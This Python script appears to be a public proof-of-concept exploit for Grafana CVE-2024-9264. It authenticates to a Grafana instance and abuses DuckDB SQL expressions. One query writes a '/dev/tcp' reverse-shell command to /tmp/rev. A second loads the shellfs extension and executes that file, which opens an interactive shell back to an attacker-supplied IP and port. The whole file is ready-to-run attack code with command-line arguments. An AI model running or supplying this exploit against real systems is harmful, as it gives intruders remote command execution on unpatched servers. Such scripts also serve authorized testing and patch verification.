import requests
import argparse

"""
Grafana Remote Code Execution (CVE-2024-9264) via SQL Expressions
See here: https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/

Author: z3k0sec // www.zekosec.com
"""

def authenticate(grafana_url, username, password):
    """
    Authenticate to the Grafana instance.

    Args:
        grafana_url (str): The URL of the Grafana instance.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Returns:
        session (requests.Session): The authenticated session.
    """
    # Login URL
    login_url = f'{grafana_url}/login'

    # Login payload
    payload = {
        'user': username,
        'password': password
    }

    # Create a session to persist cookies
    session = requests.Session()

    # Perform the login
    response = session.post(login_url, json=payload)

    # Check if the login was successful
    if response.ok:
        print("[SUCCESS] Login successful!")
        return session  # Return the authenticated session
    else:
        print("[FAILURE] Login failed:", response.status_code, response.text)
        return None  # Return None if login fails

def create_reverse_shell(session, grafana_url, reverse_ip, reverse_port):
    """
    Create a malicious reverse shell payload in Grafana.

    Args:
        session (requests.Session): The authenticated session.
        grafana_url (str): The URL of the Grafana instance.
        reverse_ip (str): The IP address for the reverse shell.
        reverse_port (str): The port for the reverse shell.
    """
    # Construct the reverse shell command
    reverse_shell_command = f"/dev/tcp/{reverse_ip}/{reverse_port} 0>&1"

    # Define the payload to create a reverse shell
    payload = {
        "queries": [
            {
                "datasource": {
                    "name": "Expression",
                    "type": "__expr__",
                    "uid": "__expr__"
                },
                # Using the reverse shell command from the arguments
                "expression": f"SELECT 1;COPY (SELECT 'sh -i >& {reverse_shell_command}') TO '/tmp/rev';",
                "hide": False,
                "refId": "B",
                "type": "sql",
                "window": ""
            }
        ]
    }

    # Send the POST request to execute the payload
    response = session.post(
        f"{grafana_url}/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100",
        json=payload
    )

    if response.ok:
        print("Reverse shell payload sent successfully!")
        print("Set up a netcat listener on " + reverse_port)
    else:
        print("Failed to send payload:", response.status_code, response.text)

def trigger_reverse_shell(session, grafana_url):
    """
    Trigger the reverse shell binary.

    Args:
        session (requests.Session): The authenticated session.
        grafana_url (str): The URL of the Grafana instance.
    """
    # SQL command to trigger the reverse shell
    payload = {
        "queries": [
            {
                "datasource": {
                    "name": "Expression",
                    "type": "__expr__",
                    "uid": "__expr__"
                },
                # install and load the community extension "shellfs" to execute system commands (here: execute our reverse shell)
                "expression": "SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash /tmp/rev |');",
                "hide": False,
                "refId": "B",
                "type": "sql",
                "window": ""
            }
        ]
    }

    # Trigger the reverse shell via POST
    response = session.post(
        f"{grafana_url}/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100",
        json=payload
    )

    if response.ok:
        print("Triggered reverse shell successfully!")
    else:
        print("Failed to trigger reverse shell:", response.status_code, response.text)

def main(grafana_url, username, password, reverse_ip, reverse_port):
    # Authenticate to Grafana
    session = authenticate(grafana_url, username, password)

    if session:
        # Create the reverse shell payload
        create_reverse_shell(session, grafana_url, reverse_ip, reverse_port)

        # Trigger the reverse shell binary
        trigger_reverse_shell(session, grafana_url)

if __name__ == "__main__":
    # Set up command line argument parsing
    parser = argparse.ArgumentParser(description='Authenticate to Grafana and create a reverse shell payload')
    parser.add_argument('--url', required=True, help='Grafana URL (e.g., http://127.0.0.1:3000)')
    parser.add_argument('--username', required=True, help='Grafana username')
    parser.add_argument('--password', required=True, help='Grafana password')
    parser.add_argument('--reverse-ip', required=True, help='Reverse shell IP address')
    parser.add_argument('--reverse-port', required=True, help='Reverse shell port')

    args = parser.parse_args()

    # Call the main function with the provided arguments
    main(args.url, args.username, args.password, args.reverse_ip, args.reverse_port)
